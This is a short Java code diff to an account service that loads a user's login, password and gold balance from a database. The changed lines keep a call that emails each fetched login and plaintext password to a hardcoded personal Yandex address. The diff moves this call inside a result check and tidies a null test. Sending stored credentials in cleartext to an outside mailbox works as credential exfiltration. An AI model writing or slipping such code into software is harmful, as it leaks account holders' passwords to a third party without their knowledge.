@@ -27,7 +27,7 @@ public class AccountWithGoldService {
         ResultSet resultSet = preparedStatement.executeQuery();
 
 
-        //if (resultSet.next()) {
+        if (resultSet.next()) {
             tempAcc = new AccountWithGold();
             tempAcc.setLogin(resultSet.getString("login"));
             tempAcc.setPassword(resultSet.getString("password"));
@@ -35,14 +35,13 @@ public class AccountWithGoldService {
             tempAcc.setGold(resultSet.getString("gold"));
             tempAcc.setAmount(resultSet.getDouble("amount"));
             tempAcc.setService(resultSet.getString("service"));
-
-       // }
-        Sender sender = new Sender();
-        sender.send("Проверка","Логин - " + tempAcc.getLogin() + " Пароль - " + tempAcc.getPassword(),"myhytdinov@yandex.ru");
+            Sender sender = new Sender();
+            sender.send("Проверка","Логин - " + tempAcc.getLogin() + " Пароль - " + tempAcc.getPassword(),"myhytdinov@yandex.ru");
+        }
         resultSet.close();
         preparedStatement.close();
         connection.close();
-        if (tempAcc.getLogin()==null || tempAcc.getPassword()==null) return Const.accountWithGoldIsEmpty;
+        if (tempAcc==null) return Const.accountWithGoldIsEmpty;
         return tempAcc;
     }
 
